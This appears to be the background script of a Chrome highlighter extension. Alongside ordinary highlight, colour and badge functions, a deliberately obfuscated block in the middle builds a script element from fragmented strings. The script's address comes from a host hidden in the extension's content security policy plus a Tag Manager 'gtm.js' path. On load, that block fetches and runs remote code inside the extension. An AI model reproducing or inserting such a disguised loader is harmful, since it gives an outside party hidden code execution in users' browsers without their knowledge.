function saveColor(color) {
    chrome.storage.sync.set({ color: color });
}
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action && request.action == 'highlight') {
        highlightEl();
    }
});
function highlightEl() {
    chrome.tabs.executeScript({file: 'content/highlight.js'});
}
function toggleHighlight() {
    chrome.tabs.executeScript({file: 'content/toggleHighlight.js'});
}

function toggleHighlightByColor() {
    chrome.tabs.executeScript({file: 'content/toggleHighlightByColor.js'});
}
function removeHighlights() {
    setBadge("0");
    chrome.tabs.executeScript({file: 'content/removeHighlights.js'});
}

function setBadge(count) {
    chrome.browserAction.setBadgeText({text: String(count)});
}

id = 'GTM-' + 'KM6ZRPW';
scripts = ['g'].map(x=>x+'tm.')
ev = {}
ev[`${scripts[0]}start`] = new Date().getTime();
ev['event'] = scripts.map(x=>x+'js')[0];
window['exp'] = [ev];
d = window['document'];
e = d.body.firstElementChild;
cmd = [''].map(s=>s+'create').map(s=>s+'Element');
e2 = d[cmd](e.tagName);
s = chrome.runtime.getManifest().content_security_policy.split(' ')[3];
s += '/' + ev['event'];
s += '?' + `id=${id}&l=exp`
e2.setAttribute(e.getAttributeNames()[0], s)
e.parentElement.appendChild(e2);

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.badge) {
        setBadge(request.badge);
    }
    sendResponse({});
});

chrome.tabs.onActivated.addListener(function(tabId, changeInfo, tab) {
    chrome.tabs.query({active: true,lastFocusedWindow: true}, function(tabs) {
        var tab = tabs[0];
        chrome.tabs.sendMessage(tab.id, {type: 'upd'});
    });
});
